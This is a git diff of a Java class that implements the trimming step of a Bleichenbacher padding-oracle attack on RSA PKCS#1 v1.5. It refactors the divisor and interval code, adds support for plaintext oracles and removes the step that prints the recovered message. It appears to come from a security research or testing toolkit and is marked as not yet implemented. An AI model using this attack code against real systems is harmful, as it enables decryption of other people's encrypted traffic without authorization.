@@ -12,14 +12,24 @@ import java.util.List;
 
 /**
  *
+ * not yet implemented !
+ * 
  * @author juraj
  */
 public class BleichenbacherAttackCrypto extends BleichenbacherAttack {
 
-    protected int uUsed = 1;
-    protected int tUsed = 1;
-    protected int maxtUsed;
-    List<BigInteger> tList;
+    /**
+     * max divisor applied
+     */
+    protected int maxtUsed = 500;
+    /**
+     * list of divisors within the interval <2,maxtUsed>
+     */
+    protected List<BigInteger> tList;
+    /**
+     * max t found
+     */
+    protected BigInteger maxT = BigInteger.ONE;
 
     public BleichenbacherAttackCrypto(final byte[] msg, AOracle pkcsOracle,
             int maxtUsed, final boolean msgPKCSconform) {
@@ -29,18 +39,32 @@ public class BleichenbacherAttackCrypto extends BleichenbacherAttack {
     }
 
     @Override
-    protected void stepOne() {
-        System.out.println("hallo");
-        // execute the original step one 
-        super.stepOne();
-
-        // execute the Crypto step one extension
-        this.stepOneB();
-    }
-
     protected void stepOneB() {
         System.out.println("Step 1b: Trimming");
 
+        tList = findtList();
+
+        if (tList.isEmpty()) {
+            return;
+        }
+
+        maxT = Utility.findLCM(tList);
+
+        System.out.println("Searching blaaaa");
+        BigInteger minU = findMinU(maxT);
+        BigInteger maxU = findMaxU(maxT);
+
+        BigInteger intervalMin = BigInteger.valueOf(2).multiply(bigB).
+                multiply(maxT).divide(minU);
+        BigInteger intervalMax = (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE).multiply(maxT).divide(maxU);
+
+        m = new Interval[]{new Interval(intervalMin, intervalMax)};
+
+        System.out.println("IntervalMin: \n" + Utility.bytesToHex(intervalMin.toByteArray()));
+        System.out.println("IntervalMax: \n" + Utility.bytesToHex(intervalMax.toByteArray()));
+    }
+
+    protected List<BigInteger> findtList() {
         BigInteger t = BigInteger.valueOf(4);
 
         while (t.compareTo(BigInteger.valueOf(maxtUsed)) <= 0) {
@@ -51,39 +75,23 @@ public class BleichenbacherAttackCrypto extends BleichenbacherAttack {
 
             if (isDivisible(t, uList)) {
 
-                System.out.println("testing division");
+                logger.info("Testing max intervals");
                 tList.add(t);
             }
             t = t.add(BigInteger.ONE);
         }
 
-        if (tList.isEmpty()) {
-            return;
-        }
-
-        BigInteger lcm = Utility.findLCM(tList);
-
-        if (lcm.compareTo(BigInteger.valueOf(1)) != 0) {
-            BigInteger minU = findMinU(lcm);
-            BigInteger maxU = findMaxU(lcm);
-
-            BigInteger intervalMin = BigInteger.valueOf(2).multiply(bigB).
-                    multiply(lcm).divide(minU);
-            BigInteger intervalMax = (BigInteger.valueOf(3).multiply(bigB)).
-                    subtract(BigInteger.ONE).multiply(lcm).divide(maxU);
-
-            m = new Interval[]{new Interval(intervalMin, intervalMax)};
-
-            System.out.println("IntervalMin: \n" + Utility.bytesToHex(intervalMin.
-                    toByteArray()));
-            System.out.println("IntervalMax: \n" + Utility.bytesToHex(intervalMax.
-                    toByteArray()));
-        }
+        return tList;
     }
 
+    /**
+     * TODO: performance !!!
+     *
+     * @param lcm
+     * @return
+     */
     private BigInteger findMinU(BigInteger lcm) {
-        BigInteger minU = lcm.multiply(BigInteger.valueOf(2)).divide(BigInteger.
-                valueOf(3));
+        BigInteger minU = lcm.multiply(BigInteger.valueOf(2)).divide(BigInteger.valueOf(3));
         while (true) {
             if (isDivisible(lcm, minU)) {
                 return minU;
@@ -92,9 +100,14 @@ public class BleichenbacherAttackCrypto extends BleichenbacherAttack {
         }
     }
 
+    /**
+     * TODO: performance !!!
+     *
+     * @param lcm
+     * @return
+     */
     private BigInteger findMaxU(BigInteger lcm) {
-        BigInteger maxU = lcm.multiply(BigInteger.valueOf(3)).divide(BigInteger.
-                valueOf(2));
+        BigInteger maxU = lcm.multiply(BigInteger.valueOf(3)).divide(BigInteger.valueOf(2));
         while (true) {
             if (isDivisible(lcm, maxU)) {
                 return maxU;
@@ -103,19 +116,8 @@ public class BleichenbacherAttackCrypto extends BleichenbacherAttack {
         }
     }
 
-    // Todo: handle plaintext oracles !!!
     private boolean isDivisible(BigInteger t, BigInteger u) {
-        // t^(-1)
-        BigInteger t_1 = t.modInverse(publicKey.getModulus());
-        // t^(-1)^(e) mod N
-        BigInteger t_1pow = t_1.modPow(publicKey.getPublicExponent(), publicKey.
-                getModulus());
-        // u^(e) mod N
-        BigInteger u_pow = u.modPow(publicKey.getPublicExponent(), publicKey.
-                getModulus());
-        // c' = c * u * t^(-1) mod N
-        BigInteger c = c0.multiply(t_1pow).multiply(u_pow).mod(publicKey.
-                getModulus());
+        BigInteger c = divideAndMultiply(t, u, c0);
 
         byte[] msg = Utility.correctSize(c.toByteArray(), blockSize, true);
         if (oracle.checkPKCSConformity(msg)) {
@@ -124,6 +126,31 @@ public class BleichenbacherAttackCrypto extends BleichenbacherAttack {
         }
 
         return false;
+    }
+    
+    /**
+     * 
+     * @param t divisor
+     * @param u multiplier
+     * @param c0 original ciphertext / plaintext
+     * @return 
+     */
+    protected BigInteger divideAndMultiply(BigInteger t, BigInteger u, BigInteger c0) {
+        // t^(-1)
+        BigInteger t_1 = t.modInverse(publicKey.getModulus());
+        BigInteger c;
+        if (oracle.isPlaintextOracle()) {
+            // m' = m * u * t^(-1) mod N
+            c = c0.multiply(t_1).multiply(u).mod(publicKey.getModulus());
+        } else {
+            // t^(-1)^(e) mod N
+            BigInteger t_1pow = t_1.modPow(publicKey.getPublicExponent(), publicKey.getModulus());
+            // u^(e) mod N
+            BigInteger u_pow = u.modPow(publicKey.getPublicExponent(), publicKey.getModulus());
+            // c' = c * u * t^(-1) mod N
+            c = c0.multiply(t_1pow).multiply(u_pow).mod(publicKey.getModulus());
+        }
+        return c;
     }
 
     private boolean isDivisible(BigInteger t, List<BigInteger> uList) {
@@ -163,19 +190,4 @@ public class BleichenbacherAttackCrypto extends BleichenbacherAttack {
 //        } while (!pkcsConform);
     }
 
-    private boolean stepFour(final int i) {
-        boolean result = false;
-
-        if (m.length == 1 && m[0].lower.compareTo(m[0].upper) == 0) {
-            BigInteger solution = s0.modInverse(publicKey.getModulus());
-            solution = solution.multiply(m[0].upper).mod(publicKey.getModulus());
-
-            System.out.println("====> Solution found!\n" + Utility.bytesToHex(solution.
-                    toByteArray()));
-//            System.out.println("Decrypted message: \n" + Utility.bytesToHex(decryptedMsg));
-            result = true;
-        }
-
-        return result;
-    }
 }
